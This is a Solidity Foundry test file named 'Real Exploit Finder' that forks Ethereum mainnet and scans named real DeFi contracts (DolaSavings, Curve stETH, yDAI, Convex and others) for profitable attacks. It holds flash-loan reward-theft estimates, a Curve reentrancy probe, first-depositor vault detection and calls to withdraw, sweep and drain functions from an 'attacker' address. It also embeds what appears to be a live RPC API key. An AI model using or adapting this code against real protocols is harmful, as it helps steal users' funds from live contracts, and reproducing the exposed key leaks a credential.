// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Real Exploit Finder
 * @notice Actually run exploits on mainnet fork
 */
contract RealExploitFinder is Test {

    // Correct checksummed addresses
    address constant DOLA_SAVINGS = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4;
    address constant DOLA = 0x865377367054516e17014CcdED1e7d814EDC9ce4;
    address constant DBR = 0xAD038Eb671c44b853887A7E32528FaB35dC5D710;
    address constant CURVE_STETH = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
    }

    /**
     * @notice Test DolaSavings state and find flash stake opportunity
     */
    function test_dolaSavingsAnalysis() public view {
        console.log("========== DOLA SAVINGS REAL ANALYSIS ==========");

        // Get actual state
        (bool s, bytes memory d) = DOLA_SAVINGS.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        uint256 totalSupply = s ? abi.decode(d, (uint256)) : 0;
        console.log("Total staked DOLA:", totalSupply / 1e18);

        (s, d) = DOLA_SAVINGS.staticcall(
            abi.encodeWithSignature("yearlyRewardBudget()")
        );
        uint256 yearlyBudget = s ? abi.decode(d, (uint256)) : 0;
        console.log("Yearly DBR budget:", yearlyBudget / 1e18);

        (s, d) = DOLA_SAVINGS.staticcall(
            abi.encodeWithSignature("lastUpdate()")
        );
        uint256 lastUpdate = s ? abi.decode(d, (uint256)) : 0;
        uint256 timeSince = block.timestamp - lastUpdate;
        console.log("Time since last update:", timeSince, "seconds");

        if (totalSupply > 0 && yearlyBudget > 0) {
            // Calculate pending rewards
            uint256 pendingRewards = (timeSince * yearlyBudget) / 365 days;
            console.log("Pending DBR rewards:", pendingRewards / 1e18);

            // Flash loan requirement
            uint256 flashAmount = totalSupply * 9;
            console.log("Flash loan needed:", flashAmount / 1e18, "DOLA");

            // Check DOLA availability
            (s, d) = DOLA.staticcall(
                abi.encodeWithSignature("balanceOf(address)", BALANCER_VAULT)
            );
            uint256 dolaAvailable = s ? abi.decode(d, (uint256)) : 0;
            console.log("DOLA in Balancer:", dolaAvailable / 1e18);

            bool canFlashLoan = dolaAvailable >= flashAmount;
            console.log("Can flash loan:", canFlashLoan);

            if (canFlashLoan && pendingRewards > 1e18) {
                uint256 attackerShare = (flashAmount * pendingRewards) / (totalSupply + flashAmount);
                console.log("Potential profit:", attackerShare / 1e18, "DBR");
                console.log("!!! PROFITABLE ATTACK AVAILABLE !!!");
            }
        }
    }

    /**
     * @notice Test Curve virtual price manipulation window
     */
    function test_curveReentrancyWindow() public {
        console.log("========== CURVE REENTRANCY TEST ==========");

        // Get current state
        (bool s, bytes memory d) = CURVE_STETH.staticcall(
            abi.encodeWithSignature("get_virtual_price()")
        );
        uint256 vp = s ? abi.decode(d, (uint256)) : 0;
        console.log("Current virtual_price:", vp);

        (s, d) = CURVE_STETH.staticcall(
            abi.encodeWithSignature("balances(uint256)", uint256(0))
        );
        uint256 ethBal = s ? abi.decode(d, (uint256)) : 0;
        console.log("ETH in pool:", ethBal / 1e18);

        (s, d) = CURVE_STETH.staticcall(
            abi.encodeWithSignature("balances(uint256)", uint256(1))
        );
        uint256 stethBal = s ? abi.decode(d, (uint256)) : 0;
        console.log("stETH in pool:", stethBal / 1e18);

        // Find LP holder
        address lpWhale = 0x41318419CFa25396b47A94896FfA2C77c6434040;
        (s, d) = CURVE_STETH.staticcall(
            abi.encodeWithSignature("balanceOf(address)", lpWhale)
        );
        uint256 whaleBal = s ? abi.decode(d, (uint256)) : 0;
        console.log("Whale LP balance:", whaleBal / 1e18);

        if (whaleBal > 0) {
            // Deploy detector
            ReentrancyProbe probe = new ReentrancyProbe(CURVE_STETH);

            // Transfer some LP to probe
            uint256 testAmount = whaleBal > 10 ether ? 10 ether : whaleBal;
            vm.prank(lpWhale);
            (s,) = CURVE_STETH.call(
                abi.encodeWithSignature("transfer(address,uint256)", address(probe), testAmount)
            );

            if (s) {
                console.log("Transferred LP to probe, executing removal...");

                try probe.executeAndCapture(testAmount) {
                    console.log("VP Before:", probe.vpBefore());
                    console.log("VP During:", probe.vpDuring());
                    console.log("VP After:", probe.vpAfter());

                    if (probe.vpDuring() < probe.vpBefore()) {
                        uint256 drop = (probe.vpBefore() - probe.vpDuring()) * 10000 / probe.vpBefore();
                        console.log("!!! VP DROPPED BY", drop, "BASIS POINTS !!!");
                        console.log("!!! REENTRANCY WINDOW CONFIRMED !!!");
                    }
                } catch Error(string memory reason) {
                    console.log("Failed:", reason);
                } catch {
                    console.log("Failed (no reason)");
                }
            }
        }
    }

    /**
     * @notice Scan for empty vaults
     */
    function test_emptyVaultScan() public view {
        console.log("========== EMPTY VAULT SCAN ==========");

        address[10] memory vaults = [
            address(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01), // yDAI
            address(0x7b4a7FD41c688A7CB116534E341e44126eF5a0fd), // cETH
            address(0xFAce851a4921ce59e912d19329929CE6da6EB0c7), // cLINK
            address(0x4f6A43Ad7cba042606dECaCA730d4CE0A57ac62e), // Saddle
            address(0x93054188d876f558f4a66B2EF1d97d16eDf0895B), // Curve renBTC
            address(0xB1F2cdeC61db658F091671F5f199635aEF202CAC), // Curve gauge
            address(0x5F465e9fcfFc217c5849906216581a657cd60605), // Convex
            address(0x4e840AADD28DA189B9906674B4Afcb77C128d9ea), // anySPELL
            address(0xA61BeB4A3d02decb01039e378237032B351125B4), // unknown
            address(0xAB73Ec65a1Ef5a2e5b56D5d6F36Bee4B2A1D3FFb)  // unknown
        ];

        uint256 emptyCount = 0;

        for (uint i = 0; i < vaults.length; i++) {
            address vault = vaults[i];

            uint256 codeSize;
            assembly { codeSize := extcodesize(vault) }
            if (codeSize == 0) continue;

            (bool s, bytes memory d) = vault.staticcall(
                abi.encodeWithSignature("totalSupply()")
            );

            if (s && d.length >= 32) {
                uint256 supply = abi.decode(d, (uint256));
                if (supply == 0) {
                    emptyCount++;
                    console.log("EMPTY VAULT:", vault);

                    // Check if has underlying
                    (s, d) = vault.staticcall(
                        abi.encodeWithSignature("token()")
                    );
                    if (s && d.length >= 32) {
                        address token = abi.decode(d, (address));
                        console.log("  Underlying:", token);
                    }
                }
            }
        }

        console.log("Empty vaults found:", emptyCount);

        if (emptyCount > 0) {
            console.log("!!! FIRST DEPOSITOR ATTACK POSSIBLE !!!");
        }
    }

    /**
     * @notice Scan contracts for unprotected withdrawal functions
     */
    function test_unprotectedWithdrawScan() public {
        console.log("========== UNPROTECTED WITHDRAW SCAN ==========");

        address[10] memory targets = [
            address(0xA4fc358455Febe425536fd1878bE67FfDBDEC59a), // Sablier
            address(0x7623e9DC0DA6FF821ddb9EbABA794054E078f8c4), // EarlyAdopterPool
            address(0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4), // DolaSavings
            address(0x4f2bC163c8758D7F88771496F7B0Afde767045F3), // BasicStakingCRO
            address(0x996913c8c08472f584ab8834e925b06D0eb1D813), // RewardVault
            address(0x82bA8da44Cd5261762e629dd5c605b17715727bd), // FraxQueue
            address(0x9A0C8Ff858d273f57072D714bca7411D717501D7), // st1INCH
            address(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01), // yDAI
            address(0x93054188d876f558f4a66B2EF1d97d16eDf0895B), // Curve renBTC
            address(0xC5cfaDA84E902aD92DD40194f0883ad49639b023)  // Curve Gauge
        ];

        address attacker = makeAddr("attacker");

        for (uint i = 0; i < targets.length; i++) {
            address target = targets[i];

            uint256 codeSize;
            assembly { codeSize := extcodesize(target) }
            if (codeSize == 0) continue;

            uint256 ethBefore = target.balance;

            // Try various withdrawal functions
            bytes4[5] memory funcs = [
                bytes4(keccak256("withdraw()")),
                bytes4(keccak256("emergencyWithdraw()")),
                bytes4(keccak256("sweep(address)")),
                bytes4(keccak256("drain()")),
                bytes4(keccak256("skim(address)"))
            ];

            for (uint j = 0; j < funcs.length; j++) {
                vm.prank(attacker);
                (bool success,) = target.call(abi.encodeWithSelector(funcs[j], attacker));

                if (success) {
                    uint256 ethAfter = target.balance;
                    if (ethAfter < ethBefore) {
                        console.log("!!! UNPROTECTED WITHDRAWAL FOUND !!!");
                        console.log("  Contract:", target);
                        console.log("  Function selector:", uint32(funcs[j]));
                        console.log("  ETH extracted:", (ethBefore - ethAfter) / 1e18);
                    }
                }
            }
        }

        console.log("Scan complete");
    }

    /**
     * @notice Run all scans
     */
    function test_runAllScans() public {
        test_dolaSavingsAnalysis();
        console.log("");
        test_emptyVaultScan();
        console.log("");
        test_unprotectedWithdrawScan();
    }
}

/**
 * @notice Probe contract to capture VP during Curve removal
 */
contract ReentrancyProbe {
    address public pool;
    uint256 public vpBefore;
    uint256 public vpDuring;
    uint256 public vpAfter;
    bool private inCallback;

    constructor(address _pool) {
        pool = _pool;
    }

    function executeAndCapture(uint256 amount) external {
        // Get VP before
        (bool s, bytes memory d) = pool.staticcall(
            abi.encodeWithSignature("get_virtual_price()")
        );
        if (s) vpBefore = abi.decode(d, (uint256));

        // Remove liquidity
        uint256[2] memory mins = [uint256(0), uint256(0)];
        (s,) = pool.call(
            abi.encodeWithSignature("remove_liquidity(uint256,uint256[2])", amount, mins)
        );
        require(s, "removal failed");

        // Get VP after
        (s, d) = pool.staticcall(
            abi.encodeWithSignature("get_virtual_price()")
        );
        if (s) vpAfter = abi.decode(d, (uint256));
    }

    receive() external payable {
        if (!inCallback) {
            inCallback = true;
            (bool s, bytes memory d) = pool.staticcall(
                abi.encodeWithSignature("get_virtual_price()")
            );
            if (s) vpDuring = abi.decode(d, (uint256));
            inCallback = false;
        }
    }
}
